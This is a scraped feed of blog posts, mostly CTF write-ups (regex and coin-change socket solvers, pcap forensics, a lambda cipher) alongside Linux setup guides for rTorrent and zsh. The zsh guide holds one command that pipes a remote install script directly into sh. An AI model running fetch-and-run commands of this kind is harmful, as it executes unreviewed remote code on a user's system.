1234567891011121314151617181920212223242526272829#!/bin/bash########ConfigURL=\"misc.chal.csaw.io\"PORT=8001######MainOUT=\"\"# Open socketexec 3&lt;&gt;/dev/tcp/$&#123;URL&#125;/$&#123;PORT&#125;read LINE &lt;&amp;3echo $LINE &gt;&amp;1while [ -z \"$EXIT\" ]do read LINE &lt;&amp;3 echo $LINE &gt;&amp;1 exrex -r \"$LINE\" &gt;&amp;3 OUT=\"\" EXIT=$( echo \"$OUT\" | awk '/Irregular/ &#123; getline; print $0 &#125;' )done My point of view: This kind of chanllenge is tricky due to bad implementation of regex server and/or regex solver so you always need to fix/wrap regex answers/solutions. I think it's better to put a short timeout (&lt;1s) rather than a lot a steps (100+) to prevent humans to do it by hand because the more steps there are the more chances you have to get a bug. I think the goal of the challenge is to make user script, use regex and parsing, use socket but not to correct/complete other's tools.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/tags/misc/"}]},{"title":"CSAW CTF - 10 - Music to my ears - Reconnaissance","slug":"CSAW-2016-10-Music-to-my-ears-Recon","date":"2016-09-17T22:00:00.000Z","updated":"2017-02-07T18:23:37.212Z","comments":true,"path":"en/CSAW-2016-10-Music-to-my-ears-Recon/","link":"","permalink":"https://rawsec.ml/en/CSAW-2016-10-Music-to-my-ears-Recon/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : CSAW CTF Qualification Round 2016 Website : https://ctf.csaw.io/ Type : Online Format : Jeopardy CTF Time : link Description Yo fam have you listened to my mixtape? user:1245880440:playlist:7bUFR2ujh1p3GfArxM0dHE Hint: The recon spans multiple sites. Author: breadchris Hint 2 was an image of a beet. Solution Note: I didn't finished the challenge. We have to look for an user and a playlist. Spotify look like to only big website to use a number id as username, so forge the URL like this: https://play.spotify.com/user/1245880440/playlist/7bUFR2ujh1p3GfArxM0dHE. So we got a playlist named Awesome CTF Music Mix Vol. 1. It's certainly the good one. The user is Chris Topher. Take the 1st letter of each songs: CHECKOUTTHELASTRADIOSTATION. What is the last radio station? A link with WGU-20 ? Last.fm ? I didn't find. The second hint is an image of a beet so we can directly think about beets.io/. No more clue to go further. My point of view: CTF organizers, PLEASE, stop to put this kind of useless challenges that make us loose our time and that have no link with cyber-security.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"reconnaissance","slug":"reconnaissance","permalink":"https://rawsec.ml/tags/reconnaissance/"}]},{"title":"CSAW CTF - 25 - Coinslot - Misc","slug":"CSAW-2016-25-coinslot-misc","date":"2016-09-17T22:00:00.000Z","updated":"2017-02-07T18:23:37.218Z","comments":true,"path":"en/CSAW-2016-25-coinslot-misc/","link":"","permalink":"https://rawsec.ml/en/CSAW-2016-25-coinslot-misc/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : CSAW CTF Qualification Round 2016 Website : https://ctf.csaw.io/ Type : Online Format : Jeopardy CTF Time : link Description #Hope #Change #Obama2008 nc misc.chal.csaw.io 8000 Solution The problem here is to split up a sum of money into its equivalent in bills and coins (minimum). Here we have to script again: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147#!/usr/bin/env python2import socketimport refrom time import sleepfrom decimal import *total = 0def recvuntil(s, pattern, tryouts): data = \"\" for i in range(tryouts): # sleep(1) data += s.recv(9999) if pattern in data: return data return datadef calc(bills): global total times = Decimal(str(total)) / Decimal(str(bills)) if times &gt;= 1: total = Decimal(str(total)) - Decimal(str(int(times))) * Decimal(str(bills)) return int(times)def main(): global total url = \"misc.chal.csaw.io\" port = 8000 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((url, port)) while True: task = recvuntil(s, \"$10,000 bills:\", 10) print(task) total = re.findall(\"\\$(.*)\\s+\\$10,000 bills:\", task) if len(total) == 0: print(task) sleep(10) else: # print(total[0]) total = Decimal(str(total[0])) # $10,000 bills: to_send = str(calc(10000)) s.sendall(to_send + \"\\n\") print(to_send) # $5,000 bills: task = recvuntil(s, \"$5,000 bills:\", 10) print(task) to_send = str(calc(5000)) s.sendall(to_send + \"\\n\") print(to_send) # $1,000 bills: task = recvuntil(s, \"$1,000 bills:\", 10) print(task) to_send = str(calc(1000)) s.sendall(to_send + \"\\n\") print(to_send) # $500 bills: task = recvuntil(s, \"$500 bills:\", 10) print(task) to_send = str(calc(500)) s.sendall(to_send + \"\\n\") print(to_send) # $100 bills: task = recvuntil(s, \"$100 bills:\", 10) print(task) to_send = str(calc(100)) s.sendall(to_send + \"\\n\") print(to_send) # $50 bills: task = recvuntil(s, \"$50 bills:\", 10) print(task) to_send = str(calc(50)) s.sendall(to_send + \"\\n\") print(to_send) # $20 bills: task = recvuntil(s, \"$20 bills:\", 10) print(task) to_send = str(calc(20)) s.sendall(to_send + \"\\n\") print(to_send) # $10 bills: task = recvuntil(s, \"$10 bills:\", 10) print(task) to_send = str(calc(10)) s.sendall(to_send + \"\\n\") print(to_send) # $5 bills: task = recvuntil(s, \"$5 bills:\", 10) print(task) to_send = str(calc(5)) s.sendall(to_send + \"\\n\") print(to_send) # $1 bills: task = recvuntil(s, \"$1 bills:\", 10) print(task) to_send = str(calc(1)) s.sendall(to_send + \"\\n\") print(to_send) # half-dollars (50c): task = recvuntil(s, \"half-dollars (50c):\", 10) print(task) to_send = str(calc(0.50)) s.sendall(to_send + \"\\n\") print(to_send) # quarters (25c): task = recvuntil(s, \"quarters (25c):\", 10) print(task) to_send = str(calc(0.25)) s.sendall(to_send + \"\\n\") print(to_send) # dimes (10c): task = recvuntil(s, \"dimes (10c):\", 10) print(task) to_send = str(calc(0.10)) s.sendall(to_send + \"\\n\") print(to_send) # nickels (5c): task = recvuntil(s, \"nickels (5c):\", 10) print(task) to_send = str(calc(0.05)) s.sendall(to_send + \"\\n\") print(to_send) # pennies (1c): task = recvuntil(s, \"pennies (1c):\", 10) print(task) to_send = str(calc(0.01)) s.sendall(to_send + \"\\n\") print(to_send)main() Oh yeah this script is dirty and can be a lot more functional but you know in CTF all is a matter of time... Proof of flag: 123456789101112131415161718192021222324252627282930313233$22479.22$10,000 bills:2$5,000 bills:0$1,000 bills:2$500 bills:0$100 bills:4$50 bills:1$20 bills:1$10 bills:0$5 bills:1$1 bills:4half-dollars (50c):0quarters (25c):0dimes (10c):2nickels (5c):0pennies (1c):2correct!flag&#123;started-from-the-bottom-now-my-whole-team-fucking-here&#125;","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/tags/misc/"}]},{"title":"CSAW CTF - 50 - Kill - Forensics","slug":"CSAW-2016-50-kill-forensics","date":"2016-09-17T22:00:00.000Z","updated":"2017-02-07T18:23:37.222Z","comments":true,"path":"en/CSAW-2016-50-kill-forensics/","link":"","permalink":"https://rawsec.ml/en/CSAW-2016-50-kill-forensics/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : CSAW CTF Qualification Round 2016 Website : https://ctf.csaw.io/ Type : Online Format : Jeopardy CTF Time : link Description Is kill can fix? Sign the autopsy file? kill.pcapng Solution If you look at the presumed PcapNg file you can see it is certainly broken because you can't open it with Whireshark and the file command shows it as raw data. 123┌─[root@parrot]─[~/CTF/CSAW/2016/Qualification/50-kill-forensics]└──╼ #file kill.pcapngkill.pcapng: data It's certainly more than just a wrong header signature so we'll use the pcapcfix tool to fix this. As there is no more header we have to use --pcapng option because default behaviour of the tool is to repair as a simple pcap file. 1234567891011121314151617┌─[root@parrot]─[~/CTF/CSAW/2016/Qualification/50-kill-forensics]└──╼ #/root/CTF/tools/pcapfix-1.1.0/pcapfix --pcapng kill.pcapngpcapfix 1.1.0 (c) 2012-2014 Robert Krause[*] Reading from file: kill.pcapng[*] Writing to file: fixed_kill.pcapng[*] File size: 2288848 bytes.[*] Unknown file type. Assuming PCAPNG format.[-] Unknown block type!: 0xaaddddaa ==&gt; SKIPPING.[-] Block size mismatch (0x1a2b3c4d != 0x0000008c) ==&gt; CORRECTED.[-] Found 128 bytes of unknown data ==&gt; SKIPPING.[-] No Section Block header found ==&gt; CREATING.[*] Progress: 20.02 %[*] Progress: 40.01 %[*] Progress: 60.04 %[*] Progress: 80.05 %[+] SUCCESS: 4 Corruption(s) fixed! Now look at the file, it seems better! 123┌─[root@parrot]─[~/CTF/CSAW/2016/Qualification/50-kill-forensics]└──╼ #file fixed_kill.pcapngfixed_kill.pcapng: pcap-ng capture file - version 1.0 Now open the Pcap-Ng file with wireshark. This is mainly a SFTP exchange so it may be interesting to look at downloaded filess with this filter: Filter ftp.request.command == STOR. Filter show us 7 downloaded files at frame 53, 130, 693, 760, 813, 2325 and 2480. 5 jpg files (image) and 2 mp4 files (video). So let's extract images first. For that we need the jpg header file signature. It can be found here on Wikipedia. 123JPEG RAW `FF D8 FF DB`JFIF begin with `FF D8 FF E0`EXIF `FF D8 FF E1` The one interesting for us is JFIF. Press CTRL + F, select Hex value as Display filter. Note that it's not necessary as the begining of the stream is not far after the STOR request command. We won't need to extract mp4 file, flag is in one of the images. Now there is two way to do it: the smart way and the dumb way. Dumb way: see the flag in the ASCII representation of the frame 696 (girls.jpg). Ok it works, but if the flag have be not so badly hidden you won't have seen it, for example if it was display on the image. Smart way: Let's extract images. Now that we know where are the files stream, we can extract files as mention: Right click on the first frame of the stream. Click on Follow TCP Stream. Select Raw representation. Save it on your disk. Do the same with next images. We can note that all images are seeable execpt girls.jpg. So what? A broken file again? Not really, if you want to see the file header in order to fix it, you discover that the flag was just injected in the file header. Let's see the raw hex dump of the image: 12345678┌─[root@parrot]─[~/CTF/CSAW/2016/Qualification/50-kill-forensics]└──╼ #xxd -l83 extract_girls.jpg00000000: ffd8 ffe0 bae0 4a46 4946 0001 0101 0001 ......JFIF......00000010: 0001 0000 fffe 003d 666c 6167 7b72 6f73 .......=flag&#123;ros00000020: 6573 5f72 5f62 6c75 655f 7669 6f6c 6574 es_r_blue_violet00000030: 735f 725f 7233 645f 6d61 7962 335f 6861 s_r_r3d_mayb3_ha00000040: 7261 6d62 6165 5f69 735f 6e6f 745f 6b69 rambae_is_not_ki00000050: 6c6c 7d ll&#125; Thanks to Shankar Raman.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"ArchLinux - Install rTorrent and ruTorrent","slug":"archlinux-install-rtorrent-rutorrent","date":"2016-09-13T22:00:00.000Z","updated":"2016-12-26T23:00:00.000Z","comments":true,"path":"en/archlinux-install-rtorrent-rutorrent/","link":"","permalink":"https://rawsec.ml/en/archlinux-install-rtorrent-rutorrent/","excerpt":"","text":"Install rTorrent As rTorrent package is always up-to-date on Arch repository, it's not needed to compile it. Install rtorrent: 1# pacman -S rtorrent Install ruTorrent Create the web server root directory if it doesn't already exist: 1# mkdir -p /usr/share/nginx/html/ Go to the web server folder and clone the ruTorrent git repository into it: 12$ cd /usr/share/nginx/html/# git clone https://github.com/Novik/ruTorrent.git rutorrent Install Nginx Install nginx-mainline: 1# pacman -S nginx-mainline Enable and start nginx: 12# systemctl enable nginx.service# systemctl start nginx.service Install and configure PHP Install php: 1# pacman -S php Install php-fpm: 1# pacman -S php-fpm Open php configuration: 1# vim /etc/php/php.ini Disable php exposure (expose_php): 1expose_php = Off Enable file uploads (file_uploads): 1file_uploads = On Set max size of post data allowed (post_max_size): 1post_max_size = 15M Set the maximum size of an uploaded file (upload_max_filesize): 1upload_max_filesize = 15M Set the timezone (date.timezone). For more security, limit the files that can be accessed by php (open_basedir): 1open_basedir = /usr/share/nginx/html/rutorrent Enable and start php-fpm: 12# systemctl enable php-fpm# systemctl start php-fpm Configure Nginx Change the default conf: 123# mkdir /etc/nginx/auth# mv /etc/nginx/nginx.conf /etc/nginx/nginx.conf.default# vim /etc/nginx/nginx.conf And add this conf: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758user http;worker_processes auto;# PID error: https://bugs.archlinux.org/task/46500# pid /run/nginx.pid;events &#123; worker_connections 1024; multi_accept on; use epoll;&#125;http &#123; charset UTF-8; ## # Basic Settings ## server_names_hash_bucket_size 64; sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; server_tokens off; # server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ## # Logging Settings ## access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; ## # Gzip Settings ## gzip on; gzip_disable &quot;msie6&quot;; gzip_vary on; gzip_proxied any; gzip_comp_level 6; gzip_buffers 16 8k; gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; ## # Virtual Host Configs ## include /etc/nginx/servers-enabled/*;&#125; Create following directories: 12# mkdir /etc/nginx/servers-available# mkdir /etc/nginx/servers-enabled Create the server domain config: 1# vim /etc/nginx/servers-available/seedbox.conf And add the conf: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465server &#123; listen 80; listen [::]:80; # Redirect all HTTP requests to HTTPS with a 301 Moved Permanently response. return 301 https://$host$request_uri;&#125;### BLOCK SERVEUR HTTPS##server &#123; listen 443 ssl http2; server_name seedbox.domain.example.org; root /usr/share/nginx/html/rutorrent; index index.php index.html index.htm;### SSL## ssl_certificate /etc/nginx/ssl/seedbox.crt; ssl_certificate_key /etc/nginx/ssl/seedbox.key; ssl_protocols TLSv1.2; ssl_ciphers EECDH+CHACHA20:EECDH+AESGCM:EECDH+AES; ssl_ecdh_curve secp384r1; ssl_prefer_server_ciphers on; # ssl optimizations ssl_session_timeout 5m; ssl_session_cache shared:SSL:20m; ssl_session_tickets on;### SECURITY## add_header X-XSS-Protection &quot;1; mode=block&quot;; auth_basic &quot;Restricted Area&quot;; auth_basic_user_file &quot;/etc/nginx/auth/seedbox_auth&quot;;### PHP## location / &#123; index index.php index.html index.htm; try_files $uri $uri/ /index.php?$args; &#125; location ~ \\.php$ &#123; try_files $uri =404; fastcgi_split_path_info ^(.+\\.php)(/.+)$; fastcgi_pass unix:/var/run/php-fpm/php-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125; location ^~ /conf/ &#123; deny all; &#125; location ^~ /share/ &#123; deny all; &#125;&#125; Don't forget to change server_name seedbox.domain.example.org; with your own domain and create a CNAME entry in your DNS configuration. Enable the server: 1# ln -s /etc/nginx/servers-available/seedbox.conf /etc/nginx/servers-enabled/seedbox.conf Configure SSL We will both view self-signed certificate and Let's Encrypt ones. Self-signed Add certificate folder: 1# mkdir /etc/nginx/ssl Generate self-signed certificate: 1234# cd /etc/nginx/ssl# openssl ecparam -genkey -name secp384r1 -out seedbox.key# openssl req -new -key seedbox.key -sha256 -out seedbox.csr# openssl req -x509 -days 3650 -sha256 -key seedbox.key -in seedbox.csr -out seedbox.crt Modify files rights: 12# chmod 644 /etc/nginx/ssl/*.crt# chmod 640 /etc/nginx/ssl/*.key Let's Encrypt TODO Add an user Create an user: 12# useradd --shell /bin/bash --create-home sdbox# passwd sdbox Create needed folder for rtorrent: 1# mkdir -p /home/sdbox/&#123;torrents,watch,.session&#125; Create rtorrent config file: 1# vim /home/sdbox/.rtorrent.rc Paste the config: 1234567891011121314151617181920scgi_port = 127.0.0.1:5001encoding_list = UTF-8port_range = 45000-65000port_random = nocheck_hash = nodirectory = /home/sdbox/torrentssession = /home/sdbox/.sessionencryption = allow_incoming, try_outgoing, enable_retryschedule = watch_directory,1,1,&quot;load_start=/home/sdbox/watch/*.torrent&quot;schedule = untied_directory,5,5,&quot;stop_untied=/home/sdbox/watch/*.torrent&quot;use_udp_trackers = yesdht = offpeer_exchange = nomin_peers = 40max_peers = 100min_peers_seed = 10max_peers_seed = 50max_uploads = 15execute = &#123;sh,-c,/usr/bin/php /usr/share/nginx/html/rutorrent/php/initplugins.php sdbox &amp;&#125;schedule = espace_disque_insuffisant,1,30,close_low_diskspace=500M Give user permissions: 123# chown --recursive sdbox:sdbox /home/sdbox# chown root:root /home/sdbox# chmod 755 /home/sdbox Edit the virtual server conf: 1# vim /etc/nginx/servers-available/seedbox.conf Add the conf: 1234567 location /SDBOX&#123; include scgi_params; scgi_pass 127.0.0.1:5001; auth_basic &quot;Restricted Area&quot;; auth_basic_user_file &quot;/etc/nginx/auth/seedbox_auth sdbox&quot;; &#125; In order to do not install apache-tools, manually generate the auth file for sdbox user (it will write over the file and don't forget to change the password in the command): 1$ echo -n &quot;sdbox:&quot; | sudo tee /etc/nginx/auth/seedbox_auth &amp;&amp; openssl passwd -apr1 password | sudo tee -a /etc/nginx/auth/seedbox_auth Protect the authentification file: 12# chmod 600 /etc/nginx/auth/seedbox_auth# chown http:http /etc/nginx/auth/* Create ruTorrent config file: 12# mkdir /usr/share/nginx/html/rutorrent/conf/users/sdbox# vim /usr/share/nginx/html/rutorrent/conf/users/sdbox/config.php And add the content: 12345678&lt;?php$pathToExternals[&apos;curl&apos;] = &apos;/usr/bin/curl&apos;;$topDirectory = &apos;/home/sdbox&apos;;$scgi_port = 5001;$scgi_host = &apos;127.0.0.1&apos;;$XMLRPCMountPoint = &apos;/SDBOX&apos;;$tempDirectory = &apos;/usr/share/nginx/html/rutorrent/tmp/&apos;; Correct permissions: 123# chown -R http:http /usr/share/nginx/html/rutorrent# chmod 0777 /usr/share/nginx/html/rutorrent/share/&#123;settings,torrents,users&#125;# systemctl restart nginx.service Create a rTorrent service Create the file /etc/systemd/system/rtorent.service (because /etc/systemd/user/ doesn't work) containing: 123456789101112131415[Unit]Description=rTorrent DaemonAfter=network.target[Service]Type=forkingKillMode=noneUser=sdboxExecStart=/usr/bin/tmux new-session -c /mnt/storage/rtorrent -s rtorrent -n rtorrent -d rtorrentExecStop=/usr/bin/bash -c &quot;/usr/bin/tmux send-keys -t rtorrent C-q &amp;&amp; while pidof rtorrent &gt; /dev/null; do sleep 0.5; done&quot;WorkingDirectory=/home/sdbox/Restart=on-failure[Install]WantedBy=multi-user.target Enable rtorrent at boot time and manually start it: 12$ systemctl enable rtorrent$ systemctl start rtorrent Source: sdbox, wiki archlinux Troubleshooting mediainfo 1mediainfo: Plugin will not work. rTorrent user can&apos;t access external program (mediainfo). You may need to install mediainfo: pacman -S mediainfo. unrar 1Unpack plugin: rTorrent user can&apos;t access &apos;unrar&apos; program. You may need to install unrar: pacman -S unrar. screenshots 1screenshots: Plugin will not work. rTorrent user can&apos;t access external program (ffmpeg). I don't use it and don't want to install ffmpeg and all its dependencies (224 MB) so I disabled it. To do so: Edit the plugin config file (global) vim /usr/share/nginx/html/rutorrent/conf/plugins.ini. And add this lines at the end: 12[screenshots]enabled = no Or if you want to use screenshots plugin just install ffmpeg: pacman -S ffmpeg. rss 1rss: Some functionality will be unavailable. Webserver user can&apos;t access external program (curl). I didn't find how to cleanly resolve that. Some tells to add /urb/bin in the open_basedir or php.ini but this is a security issue and that doesn't work in our case. So I just disabled rss plugin: Edit the plugin config file (global) vim /usr/share/nginx/html/rutorrent/conf/plugins.ini. And add this lines at the end: 12345[rss]enabled = no[rssurlrewrite]enabled = no rutracker_check 1rutracker_check: Plugin will not work. Webserver user must have execute access to the rtorrent session directory (/home/sdbox/.session/). Add /home/sdbox/.session/ into open_basedir of /etc/php/php.ini.","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"},{"name":"archlinux","slug":"linux/archlinux","permalink":"https://rawsec.ml/categories/linux/archlinux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"archlinux","slug":"archlinux","permalink":"https://rawsec.ml/tags/archlinux/"}]},{"title":"ArchLinux - Install Zsh shell and oh-my-zsh","slug":"archlinux-install-zsh","date":"2016-09-13T22:00:00.000Z","updated":"2017-02-07T18:23:36.918Z","comments":true,"path":"en/archlinux-install-zsh/","link":"","permalink":"https://rawsec.ml/en/archlinux-install-zsh/","excerpt":"","text":"Install Zsh Before installing zsh, see what shell is currently being used: 1$ echo $SHELL Install zsh: 1# pacman -S zsh For additional completion definitions, install the zsh-completions package: 1# pacman -S zsh-completions Make zsh has been installed correctly and configure it: 1$ zsh Set zsh as default shell (list shells with $ chsh -l): 1$ chsh -s /bin/zsh Install Oh My Zsh Install dependencies: 1# pacman -S curl git Install oh-my-zsh: 1sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"},{"name":"archlinux","slug":"linux/archlinux","permalink":"https://rawsec.ml/categories/linux/archlinux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"archlinux","slug":"archlinux","permalink":"https://rawsec.ml/tags/archlinux/"}]},{"title":"ASIS CTF Finals 2016 - 3 - CTF 101 - Trivia","slug":"ASIS-2016-ASIS-3-CTF-101-Trivia","date":"2016-09-10T22:00:00.000Z","updated":"2017-02-07T18:23:37.545Z","comments":true,"path":"en/ASIS-2016-ASIS-3-CTF-101-Trivia/","link":"","permalink":"https://rawsec.ml/en/ASIS-2016-ASIS-3-CTF-101-Trivia/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : ASIS CTF Finals 2016 Website : http://asis-ctf.ir/ Type : Online Format : Jeopardy CTF Time : link Description Watch your heads! Solution One-liners will be happy: 123456┌─[root@parrot]─[~/CTF]└──╼ #curl https://asis-ctf.ir/challenges/ --head | tr -d &apos;\\r&apos; | sed -En &apos;s/^Flag: (.*); base64/\\1/p&apos; | base64 -d % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- 0:00:01 --:--:-- 0ASIS&#123;31a483900b8576426cccdf55402b9dd6&#125;","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"trivia","slug":"trivia","permalink":"https://rawsec.ml/tags/trivia/"}]},{"title":"How to remove pages from a PDF in command line on Linux","slug":"remove-pages-from-pdf-command-line","date":"2016-09-07T22:00:00.000Z","updated":"2017-02-07T18:23:37.272Z","comments":true,"path":"en/remove-pages-from-pdf-command-line/","link":"","permalink":"https://rawsec.ml/en/remove-pages-from-pdf-command-line/","excerpt":"","text":"To remove pages from a PDF in command line on Linux, we'll use PDFtk. Install pdftk with your favorite packet manager (ex: sudo zypper install pdftk) And run one of those commands: To extract only one page: pdftk original.pdf cat 12 output edited.pdf. To keep only a range of pages: pdftk original.pdf cat 3-26 output edited.pdf. To keep several range and some range without knowing page number (ex: end): pdftk original.pdf cat 1-7 9-end output edited.pdf. More examples here.","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"}]},{"title":"CTF(x) - 50 - crash - Forensics","slug":"CTFx-2016-CTFx-50-crash-forensics","date":"2016-08-26T22:00:00.000Z","updated":"2017-02-07T18:23:37.578Z","comments":true,"path":"en/CTFx-2016-CTFx-50-crash-forensics/","link":"","permalink":"https://rawsec.ml/en/CTFx-2016-CTFx-50-crash-forensics/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : CTF(x) 2016 Website : http://ctfx.io/ Type : Online Format : Jeopardy CTF Time : link Description defund was about to give this flag away until his computer crashed. file: flag.zip Solution TL;DR: flag.zip contains .flag.txt.swp and flag.txt Extract the archive: unzip flag.zip Recover/restore the file with the swap file: vim -r flag/flag.txt You get some ASCII art of the flag: ctf(v1m_is_be77er_than_3macs). Extract of VIM man page: 1234-r List swap files, with information about using them for recovery.-r &#123;file&#125; Recovery mode. The swap file is used to recover a crashed editing session. The swap file is a file with the same filename as the text file with &quot;.swp&quot; appended. See &quot;:help recovery&quot;.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"CTF(x) - 50 - λ - Cryptography","slug":"CTFx-2016-CTFx-50-lambda-cryptography","date":"2016-08-26T22:00:00.000Z","updated":"2017-02-07T18:23:37.578Z","comments":true,"path":"en/CTFx-2016-CTFx-50-lambda-cryptography/","link":"","permalink":"https://rawsec.ml/en/CTFx-2016-CTFx-50-lambda-cryptography/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : CTF(x) 2016 Website : http://ctfx.io/ Type : Online Format : Jeopardy CTF Time : link Description I used this program to encrypt a flag. The output was: n1s4_t1An(f1ctdb@mpl_h3)m3lp3y__Eas file: λ.py Solution TL;DR : that solution is just a trick not a smart de-obfuscation. Here is the code of the λ.py: 1print (lambda j,m:(lambda f,t:t if len(t) &lt;= 1 else j([f(f,x)for x in m(j,m(reversed,(lambda s:zip(*[iter(s)]*(len(s)/2)))(t+\"\\x01\"*(len(t)%2))))]))(lambda f,t:t if len(t) &lt;= 1 else j([f(f,x)for x in m(j,m(reversed,(lambda s: zip(*[iter(s)]*(len(s)/2)))(t+\"\\x01\"*(len(t)%2))))]),raw_input(\"Plaintext:\")))(''.join,map).replace(\"\\x01\",\"\") It's clear that the code is obfuscated, but even beautified it's still a mess. So as I don't want my brain to blow trying to de-obfuscate this, I got around. I realized that, with enought iteration, we gan get back the original string. So I modified the code to &quot;brute-force&quot; the good combination: 1234567891011# Modiied codemixed_flag = \"n1s4_t1An(f1ctdb@mpl_h3)m3lp3y__Eas\"for i in range(100): old_mixed_flag = mixed_flag mixed_flag = (lambda j, m: (lambda f, t: t if len(t) &lt;= 1 else j([f(f, x) for x in m(j, m(reversed, (lambda s: zip( * [iter(s)] * (len(s) / 2)))(t + \"\\x01\" * (len(t) % 2))))]))(lambda f, t: t if len(t) &lt;= 1 else j([f(f, x) for x in m(j, m(reversed, (lambda s: zip( * [iter(s)] * (len(s) / 2)))(t + \"\\x01\" * (len(t) % 2))))]), old_mixed_flag))(''.join, map).replace(\"\\x01\", \"\") print(str(i) + \" \" + mixed_flag) Here the non-filtered output, that's quite long: 123456789┌─[root@parrot]─[~/CTF/CTFx/2016/50-lambda_λ-cryptography]└──╼ #python lambda_λ.py0 c1t(fm@db4s_n1nAt1_y_p3sEah_3pll3)m1 n_14s1tnA(tfc1bdm@lpl_3m3)p_3_yhasE2 cf1(t@mbd41sn_An1ty_h_3Eas_l3lpp)m3[...]97 n_14s1tnA(tfc1bdm@lph_3m3)_l3_ypasE98 cf1(t@mbd41sn_An1ty_pl3Eas_h3lp_)m399 ns_41t1An(1tcfdb@mpl_h33)mlp3y__sEa Now let's see what begins with ctf( 123456789101112131415161718┌─[root@parrot]─[~/CTF/CTFx/2016/50-lambda_λ-cryptography]└──╼ #python lambda_λ.py | grep &apos;ctf(&apos;4 ctf(1m@db4_1nsnAt1_y_h3asElp3pl_m3)10 ctf(1@mbd4_1nsAn1ty__p3asEh_3lplm3)16 ctf(1m@db4_1nsnAt1_yl_3asEp_3plhm3)22 ctf(1@mbd4_1nsAn1ty_h_3asE_l3lppm3)28 ctf(1m@db4_1nsnAt1_ypl3asE_h3pl_m3)34 ctf(1@mbd4_1nsAn1ty__h3asElp3lp_m3)40 ctf(1m@db4_1nsnAt1_y_p3asEh_3pllm3)46 ctf(1@mbd4_1nsAn1ty_l_3asEp_3lphm3)52 ctf(1m@db4_1nsnAt1_yh_3asE_l3plpm3)58 ctf(1@mbd4_1nsAn1ty_pl3asE_h3lp_m3)64 